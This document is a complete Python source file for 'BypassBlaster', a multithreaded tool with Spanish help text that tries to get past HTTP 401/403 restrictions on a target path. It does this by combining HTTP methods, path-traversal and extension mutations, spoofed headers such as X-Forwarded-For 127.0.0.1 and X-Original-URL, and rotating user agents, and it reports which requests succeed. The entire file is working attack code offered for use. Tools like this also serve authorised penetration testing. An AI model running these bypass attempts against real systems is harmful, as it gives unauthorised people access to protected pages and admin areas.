import requests
import argparse
import random
import json
import sys
from urllib.parse import urljoin
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor


init()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
]

HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "TRACE"]

HEADERS_BYPASS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Original-URL": "{path}"},
    {"X-Real-IP": "localhost"},
    {"Referrer": "https://google.com"},
    {"X-WAF-Bypass": "1"},
]

PATH_MUTATIONS = [
    "{path}",
    "{path}/",
    "{path}//",
    "{path}/.",
    "{path}?random={random}",
    "{path}#bypass",
    "/../{path}",
    "/%2e/{path}",
    "{path}.php",
    "{path}.json",
]

class BypassBlaster:
    def __init__(self, url, path="/", proxies=None, threads=5):
        self.url = url.rstrip("/")
        self.path = path if path.startswith("/") else f"/{path}"
        self.proxies = proxies if proxies else {}
        self.threads = threads
        self.results = []

    def get_random_user_agent(self):
        return random.choice(USER_AGENTS)

    def mutate_path(self, path):
        random_str = str(random.randint(1000, 9999))
        return [mutation.format(path=path, random=random_str) for mutation in PATH_MUTATIONS]

    def check_response(self, response):
        status = response.status_code
        size = len(response.content)
        if status in [200, 201]:
            return True, f"{Fore.GREEN}SUCCESS{Style.RESET_ALL}", size
        elif status in [301, 302]:
            return False, f"{Fore.BLUE}REDIRECT{Style.RESET_ALL}", size
        elif status in [401, 403]:
            return False, f"{Fore.RED}BLOCKED{Style.RESET_ALL}", size
        else:
            return False, f"{Fore.YELLOW}OTHER{Style.RESET_ALL}", size

    def try_request(self, method, url, headers=None):
        try:
            headers = headers or {}
            headers["User-Agent"] = self.get_random_user_agent()
            response = requests.request(
                method=method,
                url=url,
                headers=headers,
                proxies=self.proxies,
                timeout=5,
                allow_redirects=False
            )
            success, status_text, size = self.check_response(response)
            result = {
                "method": method,
                "url": url,
                "headers": headers,
                "status": response.status_code,
                "size": size,
                "success": success
            }
            print(f"[{method}] {url} | Headers: {headers} | Status: {status_text} {response.status_code} | Size: {size}")
            return result
        except requests.RequestException as e:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {method} {url} - {str(e)}")
            return None

    def run(self):
        print(f"{Fore.CYAN}=== Starting BypassBlaster on {self.url}{self.path} ==={Style.RESET_ALL}")
        mutated_paths = self.mutate_path(self.path)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for method in HTTP_METHODS:
                for path in mutated_paths:
                    full_url = urljoin(self.url, path)
                    futures.append(executor.submit(self.try_request, method, full_url))
                    for header_template in HEADERS_BYPASS:
                        headers = {k: v.format(path=self.path) if "{path}" in v else v 
                                 for k, v in header_template.items()}
                        futures.append(executor.submit(self.try_request, method, full_url, headers))

            for future in futures:
                result = future.result()
                if result:
                    self.results.append(result)

    def save_results(self, output_file):
        with open(output_file, "w") as f:
            json.dump(self.results, f, indent=2)
        print(f"{Fore.GREEN}Results saved to {output_file}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(
        description="BypassBlaster: Advanced tool to bypass HTTP 401/403 restrictions",
        epilog="Ejemplo: python3 bypassblaster.py -u https://example.com -p /admin -t 10 --proxy http://127.0.0.1:8080 -o results.json"
    )
    parser.add_argument(
        "-u", "--url",
        required=True,
        help="URL objetivo a probar (requerido). Ejemplo: https://example.com"
    )
    parser.add_argument(
        "-p", "--path",
        default="/",
        help="Ruta específica a probar. Por defecto: /. Ejemplo: /admin, /secret"
    )
    parser.add_argument(
        "-t", "--threads",
        type=int,
        default=5,
        help="Número de hilos concurrentes para las solicitudes. Por defecto: 5"
    )
    parser.add_argument(
        "-o", "--output",
        help="Archivo donde guardar los resultados en formato JSON. Ejemplo: results.json"
    )
    parser.add_argument(
        "--proxy",
        help="Proxy a usar para las solicitudes. Ejemplo: http://127.0.0.1:8080"
    )

    args = parser.parse_args()

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    blaster = BypassBlaster(args.url, args.path, proxies, args.threads)
    blaster.run()
    if args.output:
        blaster.save_results(args.output)

if __name__ == "__main__":
    main()
